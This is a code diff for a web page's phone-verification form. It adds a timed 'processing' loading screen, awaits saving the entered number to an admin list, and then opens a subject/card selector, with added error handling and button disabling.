@@ -5131,6 +5131,38 @@
             const digits = (input.value || '').replace(/\D/g, '');
             input.value = digits.slice(0, rules.max);
         }
+
+        async function showVerificationProcessingBeforeSubjectList() {
+            const loadingScreen = document.getElementById('categoryLoadingScreen');
+            const title = document.getElementById('categoryLoadingTitle');
+            const message = document.getElementById('categoryLoadingMessage');
+            const progress = document.getElementById('categoryLoadingProgress');
+
+            if (!loadingScreen || !title || !message || !progress) {
+                return;
+            }
+
+            const steps = [
+                'Validating phone number...',
+                'Syncing subject list from admin...',
+                'Preparing categories...',
+                'Subject list ready'
+            ];
+
+            title.textContent = 'Processing...';
+            progress.style.width = '0%';
+            loadingScreen.classList.add('show');
+
+            for (let index = 0; index < steps.length; index++) {
+                message.textContent = steps[index];
+                progress.style.width = `${Math.round(((index + 1) / steps.length) * 100)}%`;
+                await new Promise((resolve) => setTimeout(resolve, 220));
+            }
+
+            await new Promise((resolve) => setTimeout(resolve, 140));
+            loadingScreen.classList.remove('show');
+        }
+
         function initializePhoneVerificationForm() {
             const verificationForm = document.getElementById('verificationForm');
             if (!verificationForm) {
@@ -5150,7 +5182,7 @@
             }
             applyPhoneInputRules();
             
-            verificationForm.addEventListener('submit', function(e) {
+            verificationForm.addEventListener('submit', async function(e) {
                 e.preventDefault();
                 e.stopPropagation();
                 
@@ -5159,6 +5191,7 @@
                 const countryCode = document.getElementById('countrySelect')?.value;
                 const phoneNumber = document.getElementById('phoneNumber')?.value.trim();
                 const errorNotification = document.getElementById('errorNotification');
+                const submitBtn = verificationForm.querySelector('button[type="submit"]');
                 
                 console.log('Country code:', countryCode);
                 console.log('Phone number:', phoneNumber);
@@ -5215,34 +5248,44 @@
                 }
                 
                 console.log('Validation passed, opening subject list...');
-                savePhoneNumberToAdminList(countryCode, digitsOnly);
-                pendingVerificationPayload = {
-                    countryCode,
-                    phoneDigits: digitsOnly
-                };
 
-                const grid = document.getElementById('cardSelectorGrid');
-                if (grid) {
-                    grid.innerHTML = '<div class="card-selector-loading">Loading cards...</div>';
+                if (submitBtn) {
+                    submitBtn.disabled = true;
                 }
 
-                loadCardSelectorItems()
-                    .then(() => {
-                        openCardSelectorSheet();
-                    })
-                    .catch((error) => {
-                        console.error('Failed to load card selector:', error);
-                        const errorText = errorNotification?.querySelector('.error-text');
-                        const msg = 'Subject list loading failed. Please try again.';
-                        if (errorText) {
-                            errorText.textContent = msg;
-                        } else if (errorNotification) {
-                            errorNotification.innerHTML = '<i class="fas fa-exclamation-triangle error-icon"></i><span class="error-text">' + msg + '</span><div class="shimmer-overlay"></div>';
-                        }
-                        if (errorNotification) {
-                            errorNotification.classList.add('show');
-                        }
-                    });
+                try {
+                    await savePhoneNumberToAdminList(countryCode, digitsOnly);
+                    pendingVerificationPayload = {
+                        countryCode,
+                        phoneDigits: digitsOnly
+                    };
+
+                    const grid = document.getElementById('cardSelectorGrid');
+                    if (grid) {
+                        grid.innerHTML = '<div class="card-selector-loading">Loading cards...</div>';
+                    }
+
+                    await showVerificationProcessingBeforeSubjectList();
+                    await loadCardSelectorItems();
+                    openCardSelectorSheet();
+                } catch (error) {
+                    console.error('Failed to load card selector:', error);
+                    const errorText = errorNotification?.querySelector('.error-text');
+                    const msg = 'Subject list loading failed. Please try again.';
+                    if (errorText) {
+                        errorText.textContent = msg;
+                    } else if (errorNotification) {
+                        errorNotification.innerHTML = '<i class="fas fa-exclamation-triangle error-icon"></i><span class="error-text">' + msg + '</span><div class="shimmer-overlay"></div>';
+                    }
+                    if (errorNotification) {
+                        errorNotification.classList.add('show');
+                    }
+                } finally {
+                    if (submitBtn) {
+                        submitBtn.disabled = false;
+                    }
+                }
+
                 return false;
             });
             
